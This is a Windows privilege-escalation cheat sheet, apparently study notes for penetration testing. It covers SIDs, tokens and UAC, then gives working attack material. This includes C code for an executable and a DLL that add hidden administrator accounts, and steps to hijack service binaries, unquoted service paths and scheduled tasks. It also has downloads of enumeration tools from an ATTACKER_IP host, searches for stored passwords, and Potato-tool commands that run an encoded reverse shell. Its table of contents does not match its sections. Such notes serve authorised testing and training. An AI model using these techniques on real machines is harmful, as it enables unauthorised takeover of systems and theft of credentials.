# Windows Privilege Escalation - Cheat Sheet & Walkthrough

## Table of Contents
1. [Windows Privilege Basics](#1-windows-privilege-basics)
2. [Situational Awareness & Enumeration](#2-situational-awareness--enumeration)
3. [Information Goldmines](#3-information-goldmines)
4. [Leveraging Windows Services](#4-leveraging-windows-services)
5. [Abusing Other Windows Components](#5-abusing-other-windows-components)
6. [Using Exploits](#6-using-exploits)
7. [Quick Reference](#7-quick-reference)

---

## 1. Windows Privilege Basics

### 1.1 Security Identifiers (SIDs)

> Windows uses SIDs (not usernames) to identify principals for access control.

#### SID Structure
```
S-R-X-Y
│ │ │ └─ Sub-authorities (Domain Identifier + RID)
│ │ └─── Identifier Authority (5 = NT Authority)
│ └───── Revision (always 1)
└─────── Literal "S"
```

#### Well-Known SIDs

| SID | Identity |
|-----|----------|
| `S-1-0-0` | Nobody |
| `S-1-1-0` | Everybody |
| `S-1-5-11` | Authenticated Users |
| `S-1-5-18` | Local System |
| `S-1-5-domain-500` | Administrator |

#### RID (Relative Identifier)
- RID ≥ 1000 = Regular user
- RID < 1000 = Built-in/Well-known
- RID 500 = Built-in Administrator

---

### 1.2 Access Tokens

#### Types of Tokens

| Token Type | Description |
|------------|-------------|
| **Primary Token** | Assigned to processes; defines permissions |
| **Impersonation Token** | Thread-level; temporary security context |

#### Token Contents
- User SID
- Group SIDs
- User/Group Privileges
- Integrity Level

---

### 1.3 Mandatory Integrity Control (MIC)

#### Integrity Levels

| Level | Description | Examples |
|-------|-------------|----------|
| **System** | Most trusted | Winlogon, LSASS |
| **High** | Admin privileges | Elevated processes |
| **Medium** | Standard user (default) | Regular apps |
| **Low** | Restricted/sandboxed | Browsers |
| **Untrusted** | Highly restricted | Unknown sources |

**Key Rule**: Lower integrity cannot modify higher integrity objects.

**Check Integrity**:
```powershell
# User integrity
whoami /groups

# Process integrity (Process Explorer)
# View → Select Columns → Integrity Level
```

---

### 1.4 User Account Control (UAC)

#### How UAC Works
```
Administrator Login
       ↓
Two Tokens Created
       ↓
┌──────────────────┐    ┌──────────────────┐
│ Filtered Token   │    │ Full Admin Token │
│ (Medium Integrity)│    │ (High Integrity) │
└──────────────────┘    └──────────────────┘
       ↓                        ↓
  Regular Tasks           UAC Prompt → Elevated
```

#### UAC Impact
- Even admin processes run at medium integrity by default
- Must elevate to modify system files/registry
- UAC bypass techniques are common privesc vectors

---

## 2. Situational Awareness & Enumeration

### 2.1 Key Information to Gather

```
✓ Username and hostname
✓ Group memberships
✓ Existing users and groups
✓ OS version and architecture
✓ Network information
✓ Installed applications
✓ Running processes
```

### 2.2 Enumeration Commands

#### User & Group Information

```powershell
# Current user
whoami

# Hostname
hostname

# User groups
whoami /groups

# All local users
Get-LocalUser
# or
net user

# All local groups
Get-LocalGroup
# or
net localgroup

# Group members
Get-LocalGroupMember Administrators
# or
net localgroup Administrators
```

#### OS & System Information

```powershell
# OS version, architecture, patches
systeminfo

# Quick version
Get-ComputerInfo

# Installed updates
Get-CimInstance -Class win32_quickfixengineering

# Privileges
whoami /priv
```

#### Network Information

```powershell
# Network interfaces
ipconfig /all

# Routing table
route print

# Active connections
netstat -ano
```

#### Running Processes

```powershell
# All processes
Get-Process

# Filter by name
Get-Process | Where-Object {$_.ProcessName -like "*http*"}
```

#### Installed Applications

```powershell
# 32-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Select displayname

# 64-bit apps
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | 
    Select displayname

# Check Program Files directories
dir "C:\Program Files"
dir "C:\Program Files (x86)"
```

---

### 2.3 Hidden in Plain View

#### Search for Sensitive Files

```powershell
# Password manager databases
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue

# Config files
Get-ChildItem -Path C:\ -Include *.ini,*.config,*.conf -File -Recurse -ErrorAction SilentlyContinue

# Common sensitive files
Get-ChildItem -Path C:\Users\ -Include *.txt,*.docx,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue

# Specific application configs
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
```

#### Common Password Locations

| Location | What to Look For |
|----------|------------------|
| Desktop | Notes, text files, shortcuts |
| Documents | Meeting notes, HR files |
| Downloads | Old config files |
| AppData | Application configs |
| Program Files | Config files, ini files |
| C:\ | Password.txt, config.txt |

#### Using `findstr` for Content Search
```cmd
# Search for password strings in files
findstr /si "password" C:\Users\*.txt
findstr /si "pass" C:\*.ini C:\*.config
```

---

### 2.4 PowerShell Information Goldmine

#### PSReadline History

```powershell
# Get history file path
(Get-PSReadlineOption).HistorySavePath

# Read history
type C:\Users\USERNAME\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

**Why It Matters**:
- `Clear-History` doesn't clear PSReadline history!
- Contains commands even when user used `Clear-History`

#### PowerShell Transcription

```powershell
# Check for transcript logs
Get-ChildItem -Path C:\ -Include *transcript*.txt -Recurse -ErrorAction SilentlyContinue

# Common locations
C:\Users\Public\Transcripts\
C:\Users\USERNAME\Transcripts\
C:\Windows\Temp\
```

#### Script Block Logging

```
Located in Windows Event Logs:
- Applications and Services → Microsoft → Windows → PowerShell
- Event IDs: 4104 (Script Block)
- Captures full command content
```

---

### 2.5 Automated Enumeration

#### WinPEAS

```bash
# Install
sudo apt install peass-ng

# Copy to web root
cp /usr/share/peass/winpeas/winPEASx64.exe .

# Serve
python3 -m http.server 80
```

**Download & Run on Target**:
```powershell
iwr -uri http://ATTACKER_IP/winPEASx64.exe -Outfile winPEAS.exe
.\winPEAS.exe
```

**Output Legend**:
- 🔴 Red = Misconfigured/Interesting
- 🟢 Green = Protected/Well-configured
- 🔵 Blue = Disabled users
- 🟡 Yellow = Links

#### PowerUp.ps1

```powershell
# Download
iwr -uri http://ATTACKER_IP/PowerUp.ps1 -Outfile PowerUp.ps1

# Import
powershell -ep bypass
. .\PowerUp.ps1

# Commands
Get-ModifiableServiceFile
Get-UnquotedService
Invoke-AllChecks
```

#### Other Tools

| Tool | Purpose |
|------|---------|
| **Seatbelt** | Fast enumeration |
| **JAWS** | PowerShell enumeration |
| **SharpUp** | C# enumeration |

---

## 3. Leveraging Windows Services

### 3.1 Service Enumeration

```powershell
# List all services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Running services
Get-CimInstance -ClassName win32_service | 
    Where-Object {$_.State -like 'Running'} | 
    Select Name,State,PathName

# Check service start type
Get-CimInstance -ClassName win32_service | 
    Select Name, StartMode | 
    Where-Object {$_.Name -like 'mysql'}
```

### 3.2 Service Binary Hijacking

#### Attack Flow
```
1. Identify modifiable service binary
2. Create malicious binary
3. Replace original binary
4. Restart service (or reboot)
5. Payload executes with service privileges
```

#### Check Permissions

```powershell
# Check file permissions
icacls "C:\path\to\service.exe"

# Look for:
# (F) - Full access (writable)
# (W) - Write access
```

**icacls Permission Masks**:
| Mask | Permission |
|------|------------|
| `F` | Full Access |
| `M` | Modify |
| `RX` | Read/Execute |
| `R` | Read |
| `W` | Write |

#### Create Malicious Binary

```c
#include <stdlib.h>

int main ()
{
  int i;
  i = system ("net user dave2 password123! /add");
  i = system ("net localgroup administrators dave2 /add");
  return 0;
}
```

**Compile (x64)**:
```bash
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
```

#### Restart Service

```powershell
# Check if user can restart
Start-Service ServiceName
Stop-Service ServiceName

# If denied, check if service starts automatically
Get-CimInstance -ClassName win32_service | Select Name, StartMode

# Reboot (if user has SeShutdownPrivilege)
shutdown /r /t 0
```

#### PowerUp Detection

```powershell
Get-ModifiableServiceFile
# Shows services where current user can modify binary
```

---

### 3.3 DLL Hijacking

#### DLL Search Order
```
1. Application directory
2. System directory (C:\Windows\System32)
3. 16-bit system directory
4. Windows directory
5. Current directory
6. PATH directories
```

#### Attack Flow
```
1. Find missing DLL (or writable existing DLL)
2. Create malicious DLL
3. Place DLL in application directory
4. Wait for application to load DLL
5. Payload executes
```

#### Identifying Missing DLLs

**With Procmon** (Admin required):
1. Start Process Monitor
2. Filter: Process Name → `target.exe`
3. Filter: Operation → `CreateFile`
4. Filter: Result → `NAME NOT FOUND`
5. Look for DLLs that fail to load

**Check if directory is writable**:
```powershell
icacls "C:\Program Files\App\"
# Look for (W) or (F) for Users group
```

#### DLL Code Example

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved)
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH:
            system("net user dave3 password123! /add");
            system("net localgroup administrators dave3 /add");
            break;
    }
    return TRUE;
}
```

**Compile to DLL**:
```bash
x86_64-w64-mingw32-gcc TextShaping.cpp --shared -o TextShaping.dll
```

---

### 3.4 Unquoted Service Paths

#### How It Works
```
Unquoted path: C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe

Windows tries:
1. C:\Program.exe
2. C:\Program Files\Enterprise.exe
3. C:\Program Files\Enterprise Apps\Current.exe
4. C:\Program Files\Enterprise Apps\Current Version\GammaServ.exe
```

#### Find Vulnerable Services

```cmd
# Find services outside Windows with unquoted paths
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

#### Exploit Steps

1. **Identify path with write permissions**:
```powershell
icacls "C:\Program Files\Enterprise Apps"
```

2. **Place malicious binary**:
```powershell
# If "Current.exe" is the vulnerable path component
copy adduser.exe "C:\Program Files\Enterprise Apps\Current.exe"
```

3. **Restart service**:
```powershell
Start-Service GammaService
# May error, but code executes
```

4. **Check for new admin account**:
```powershell
net user
net localgroup administrators
```

#### PowerUp Automated

```powershell
# Find unquoted services
Get-UnquotedService

# Exploit
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
Restart-Service GammaService
```

---

## 4. Abusing Other Windows Components

### 4.1 Scheduled Tasks

#### Enumeration

```cmd
# View all tasks with details
schtasks /query /fo LIST /v

# Look for:
# - Run As User (privileged?)
# - Task To Run (path/executable)
# - Next Run Time (how often?)
# - Status (enabled?)
```

#### Key Task Properties

| Property | Why Important |
|----------|---------------|
| `Run As User` | Privilege level of execution |
| `Task To Run` | File to be executed |
| `Next Run Time` | How often it runs |
| `Status` | Enabled or disabled |

#### Exploit Steps

1. **Find writable task action**:
```powershell
# Identify task action path
# Check permissions
icacls "C:\Users\steve\Pictures\BackendCacheCleanup.exe"
```

2. **Replace executable**:
```powershell
# Backup original
move "C:\Users\steve\Pictures\BackendCacheCleanup.exe" BackendCacheCleanup.exe.bak

# Copy malicious binary
copy adduser.exe "C:\Users\steve\Pictures\BackendCacheCleanup.exe"
```

3. **Wait for task execution**

---

### 4.2 Windows Kernel Exploits

#### Considerations

- Can crash the system
- Must get permission before using
- Test in sandbox first
- Review source code before running

#### Common Kernel Exploits

| Exploit | CVE | OS |
|---------|-----|-----|
| CVE-2023-29360 | Kernel privilege escalation | Windows 11/10 |
| CVE-2018-8120 | Kernel privesc | Windows 7/Server 2008 |
| CVE-2015-1701 | Kernel privesc | Windows 8/Server 2012 |
| CVE-2014-1767 | Kernel privesc | Windows 7/Server 2008 |

#### Discovery Process

1. **Check OS version and patches**:
```powershell
systeminfo
Get-CimInstance -Class win32_quickfixengineering | 
    Where-Object { $_.Description -eq "Security Update" }
```

2. **Search for exploits**:
```bash
searchsploit windows 11
```

3. **Download and test in sandbox**

---

### 4.3 Abusing Privileges (SeImpersonatePrivilege)

#### Common Privileges for Escalation

| Privilege | Attack Vector |
|-----------|---------------|
| `SeImpersonatePrivilege` | Potato attacks |
| `SeBackupPrivilege` | SAM backup |
| `SeAssignPrimaryToken` | Token manipulation |
| `SeLoadDriver` | Driver loading |
| `SeDebug` | LSASS access |

#### SeImpersonatePrivilege Attack

**Check Privilege**:
```powershell
whoami /priv
# Look for SeImpersonatePrivilege: Enabled
```

**Potato Attack Flow**:
```
1. Create named pipe server
2. Coerce SYSTEM to connect
3. Impersonate SYSTEM token
4. Execute commands as SYSTEM
```

#### Using SigmaPotato

```bash
# Download SigmaPotato
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
```

**Execute**:
```powershell
# Add user
.\SigmaPotato "net user dave4 lab /add"

# Add to admin group
.\SigmaPotato "net localgroup Administrators dave4 /add"

# Execute reverse shell (PowerShell)
.\SigmaPotato "powershell -enc BASE64_PAYLOAD"
```

#### Other Potato Tools

| Tool | Description |
|------|-------------|
| RottenPotato | Original |
| JuicyPotato | Improved, multiple CLSIDs |
| SweetPotato | More reliable |
| GodPotato | Newer variant |
| SigmaPotato | Most recent, stable |

---

## 5. Quick Reference

### Key Commands

#### Enumeration
```powershell
# User info
whoami
whoami /groups
whoami /priv
net user

# Group info
net localgroup
net localgroup Administrators

# System info
systeminfo
Get-ComputerInfo

# Network
ipconfig /all
route print
netstat -ano

# Processes
Get-Process

# Installed software
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# Services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName

# Scheduled tasks
schtasks /query /fo LIST /v
```

#### File Search
```powershell
# Search for files
Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.config -File -Recurse -ErrorAction SilentlyContinue

# Search for content
findstr /si "password" C:\Users\*.txt

# Check permissions
icacls "C:\path\to\file.exe"
```

#### PowerShell History
```powershell
# PSReadline history
(Get-PSReadlineOption).HistorySavePath
type C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

# Transcript files
Get-ChildItem -Path C:\ -Include *transcript*.txt -Recurse -ErrorAction SilentlyContinue
```

---

### Attack Checklist

#### Service Attacks
- [ ] Enumerate services
- [ ] Check binary permissions (icacls)
- [ ] Check service restart permissions
- [ ] Create malicious binary
- [ ] Replace original binary
- [ ] Restart service or reboot
- [ ] Verify new admin account

#### DLL Hijacking
- [ ] Identify application with DLL loading
- [ ] Find missing/writable DLL
- [ ] Create malicious DLL (DllMain)
- [ ] Place DLL in application directory
- [ ] Wait for application execution

#### Unquoted Service Path
- [ ] Find unquoted service paths
- [ ] Identify writable path component
- [ ] Create malicious binary
- [ ] Place in writable directory
- [ ] Restart service

#### Scheduled Tasks
- [ ] List all scheduled tasks
- [ ] Find tasks running as privileged users
- [ ] Check task action permissions
- [ ] Replace action binary
- [ ] Wait for task execution

---

### Privilege Escalation Flow

```
Initial Access (Low Privilege)
          ↓
┌─────────────────────────────────────────┐
│        Situational Awareness            │
├─────────────────────────────────────────┤
│ • Users & Groups                        │
│ • OS Version & Patches                  │
│ • Installed Apps                        │
│ • Running Services                      │
│ • Scheduled Tasks                       │
└─────────────────────────────────────────┘
          ↓
┌─────────────────────────────────────────┐
│        Find Attack Vector               │
├─────────────────────────────────────────┤
│ • Sensitive Files                       │
│ • PowerShell History/Transcripts        │
│ • Weak Service Permissions              │
│ • Unquoted Service Paths                │
│ • Scheduled Tasks                       │
│ • Kernel Exploits                       │
│ • Privilege Abuse (SeImpersonate, etc.) │
└─────────────────────────────────────────┘
          ↓
┌─────────────────────────────────────────┐
│          Execute Attack                 │
├─────────────────────────────────────────┤
│ • Replace Binary/DLL                    │
│ • Run Exploit                           │
│ • Abuse Privilege                       │
└─────────────────────────────────────────┘
          ↓
    Elevated Privileges
```

### Key Takeaways

| Concept | Key Point |
|---------|-----------|
| **SID** | Windows uses SIDs, not usernames |
| **Integrity Levels** | Lower cannot modify higher |
| **UAC** | Admins run at medium by default |
| **PSReadline** | `Clear-History` doesn't clear it |
| **Service Binary** | Look for writable (F/W) permissions |
| **DLL Hijacking** | Place DLL in app directory |
| **Unquoted Path** | Windows tries multiple paths |
| **SeImpersonate** | Potato attacks |
| **Scheduled Tasks** | Check actions and permissions |